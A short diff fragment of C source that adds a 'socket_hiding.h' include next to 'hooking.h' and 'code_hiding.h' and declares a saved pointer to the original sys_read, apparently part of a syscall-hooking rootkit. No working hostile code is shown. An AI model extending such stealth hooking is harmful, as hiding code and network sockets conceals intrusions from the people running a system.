@@ -11,6 +11,7 @@
 
 #include "hooking.h"
 #include "code_hiding.h"
+#include "socket_hiding.h"
 
 ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
 
